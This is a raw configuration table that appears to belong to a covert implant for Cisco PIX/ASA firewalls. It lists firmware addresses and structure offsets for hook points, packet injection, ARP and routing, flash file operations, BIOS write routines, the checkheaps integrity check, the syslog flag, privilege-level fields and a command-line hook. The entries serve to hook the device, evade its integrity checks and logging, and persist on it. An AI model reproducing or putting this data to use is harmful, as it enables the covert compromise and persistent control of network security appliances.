; --- SECTION I ---
;
0x10070600            // pix version
0x536000              // address of implant configuration
0x0   0x0095e9b8      // allocb
0x1   0x0095eda4      // freeb
0x2   0x00114174      // open
0x3   0x004e0260      // ip_put
0x4   0x00114278      // close
0x5   0x00c5f420      // atoip
0x6   0x00c4d668      // memset
0x7   0x00c68794      // memmove
0x8   0x0095e664      // malloc_call_calloc
0x9   0x00c565ec      // free
0xa   0x00c4eafc      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x00c685b4      // rand
0x15  0x0011188c      // process_create
0x16  0x00112684      // process_suspend
0x17  0x00113174      // process_sleep_for
0x18  0x00777350      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x00e80ae0      // cur_t
0x1b  0x04      // channel offset in interface struct
0x1c  0x0c      // PUT offset in channel struct
0x1d  0x24      // offset to dest mac in arp structure
0x1e  0x00      // offset to next hop ip in route structure
0x1f  0x10      // size of route struct
0x20  0x004e38ac      // calc_ip_cksum
0x21  0x004e5124      // arp_loopkup
0x22  0x004e3e54      // set_block_hdr_mac_and_proto
0x23  0x004f5ab8      // get hardware interface
0x24  0x00b0f38c      // get next hop
0x25  0x00b138f8      // get route
0x26  0x004e21f4      // send_it
0x27  0x004e6f24      // arp_create
0x28  0x007c25cc      // get_hw_iface_2
0x2a  0x3c      // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2d  0x98      // iftype (interface type) structure offset (deprecated? may be incorrect if not)
0x2e  0x188      // offset from cur_t that contains the current context number
0x30  0x00d4d264      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x00e0cddc      // max number of interface cards
0x35  0x00e802c0      // internal_clock
0x36  0x007c1448      // get_interface_mac
0x37  0x00000143      // offset to hardware interface number in interface struct
0x38  0x4c      // offset to ip in route structure
0x39  0x68      // offset to interface num in route structure
0x3b  0x00443f40      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x00443ff8      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x00443980      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x00443e40      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x18        // offset in block to next IP fragment ptr 
0x40  0x00e9a1a8      // address of context list
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x0065ef1b      // address of our hook point.  Used for PBD.
JmpLocation         0x00661d4a      // address of our hook point.  Used for PBD.
CheckHeapsLoc       0x00dbb5b4      // checkheaps checksum location
ChckHeapsTimer      0x00e7fb90      // checkheaps timer location
InterfaceAddr       0x00d4d264      // same as 0x30 above
InterfaceLeng       0x000001b8      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x188      // interface name field offset
IntNumOffset        0x143      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x00e855d0      // addr of crypto structure
ArpTableAddrPtr     0x00d3fa34      // addr of first entry in ARP table
ArpTableLastPtr     0x00d3fa3c      // addr of last entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x00e92618      // addr of the bios class structure
BiosWriteAddr1      0x003b18d4      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x003b400c      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x003b4720      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x003b4f3c      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x00000000      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x00444660      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x007412f4   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x003ad0c8      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x0074129c      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x003acf58      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x00444188      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x0044366c      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x004442c0      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x004443e4     // ifs_rename; move a file
FlashGetFileInfoAddress 0x00444890  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x00445bb4     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000018  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x00c51de4  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x00ea6560 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x001140c4      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x00145bb0      // addr of the command interface start function -- telnet function
CommandListAddr     0x00d6ab7c      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00dd1688      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x00c5d640      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00f44858      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x6c            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x70            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x78            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x000008f8      // offset into the syslog structure where the logging level is stored
Open                0x00114174      // open
CLIHookAddress       0x00146078      // Address of hook into the command interface
WatchDogTimeout     0x00c8ceec      // Address where the thread timeout value is stored 
UpTimeCounter       0x00e802c0      // Address of the up time counter
;
; --- END OF SECTION II ---
;
:EOS:
;
